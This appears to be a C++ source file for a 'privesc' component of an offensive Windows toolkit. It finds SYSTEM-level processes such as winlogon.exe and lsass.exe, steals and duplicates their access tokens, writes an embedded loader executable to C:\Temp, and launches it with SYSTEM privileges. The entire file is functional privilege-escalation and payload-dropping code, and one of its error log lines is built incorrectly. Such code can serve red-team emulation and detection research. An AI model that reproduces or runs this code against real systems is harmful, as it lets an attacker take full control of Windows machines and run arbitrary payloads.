#include "privesc.hpp"

std::string componentName = "privesc";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);
	Log("[+] Beginning token impersonation.", componentName);

	HANDLE hDuplicateToken = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphDuplicateToken(static_cast<void*>(hDuplicateToken), CloseHandle);

	int err = SystemToken(&hDuplicateToken);
	if (err != 0) {
		Log("[!] System token impersonation failed with error " + err, componentName);
		return 1;
	}

	// write the loader to disk
	Log("[+] Dropping loader to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\loader.exe", std::ios::out | std::ios::binary);
	outfile.write(&loader[0], sizeof(loader));
	outfile.close();

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	Log("[*] Attempting to spawn loader with system token.", componentName);

	if (!CreateProcessWithTokenW(
		hDuplicateToken,
		LOGON_WITH_PROFILE,
		L"C:\\Temp\\loader.exe",
		NULL,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		Log("[!] Spawning loader as system failed: " + std::to_string(GetLastError()), componentName);
	}
	else {
		Log("[+] Successfully spawned loader", componentName);
	}

	return 0;
}

int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
	Log("[*] Impersonating token from PID " + std::to_string(dwPID) + ", opening target", componentName);

	// get handle to target process
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	std::unique_ptr<void, decltype(&CloseHandle)> uphProcess(static_cast<void*>(hProcess), CloseHandle);

	// ensure handle to target is valid
	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
		int err = GetLastError();
		Log("[!] Unable to get handle to target process: " + std::to_string(err), componentName);
		return err; // handle is invalid
	}

	Log("[+] Successfully obtained handle to target", componentName);

	// get handle to target process' token
	HANDLE hProcessToken = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphProcessToken(static_cast<void*>(hProcessToken), CloseHandle);
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken)) {
		int err = GetLastError();
		Log("[!] Unable to open target process' token: " + std::to_string(err), componentName);
		return err;
	}

	Log("[+] Successfully obtained handle to token", componentName);

	// duplicate the token
	DWORD dwDesiredAccess = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY;
	if (!DuplicateTokenEx(hProcessToken, dwDesiredAccess, NULL, SecurityDelegation, TokenPrimary, hNewToken)) {
		int err = GetLastError();
		Log("[!] Unable to duplicate token: " + std::to_string(err), componentName);
		return err;
	}

	Log("[+] Successfully duplicated SYSTEM token", componentName);

	return 0;
}

int SystemToken(HANDLE* hNewToken) {
	Log("[*] Locating target system processes", componentName);

	// processes that we can steal a system token from as admin
	// source: https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b
	std::vector<std::wstring> vTargets = { L"wininit.exe", L"smss.exe", L"services.exe", L"winlogon.exe", L"unsecapp.exe", L"csrss.exe", L"dllhost.exe", L"lsass.exe" };

	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);
	bool bTargetFound = false;
	DWORD dwTarget = 0;

	// get list of processes currently running on system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
	std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
	if (hSnapshot == INVALID_HANDLE_VALUE || Process32FirstW(hSnapshot, &pe) == false) {
		int err = GetLastError();
		Log("[!] Snapshot of processes is invalid or empty: " + std::to_string(err), componentName);
		return err; // list of processes is invalid or empty
	}

	// loop through the list of processes
	do {
		// check if a processes is one which we can steal system token from
		for (std::wstring exe : vTargets) {
			if (exe.compare(pe.szExeFile) == 0) {
				dwTarget = pe.th32ProcessID;
				break;
			}
		}
	} while (dwTarget == 0 && Process32NextW(hSnapshot, &pe));

	if (dwTarget == 0) {
		int err = GetLastError();
		Log("[!] Could not find a process to steal system token from: " + std::to_string(err), componentName);
		return err; // did not find a process to steal system token from
	}

	Log("[+] Found PID " + std::to_string(dwTarget) + " to target", componentName);

	// impersonate system token
	return ImpersonateToken(dwTarget, hNewToken);
}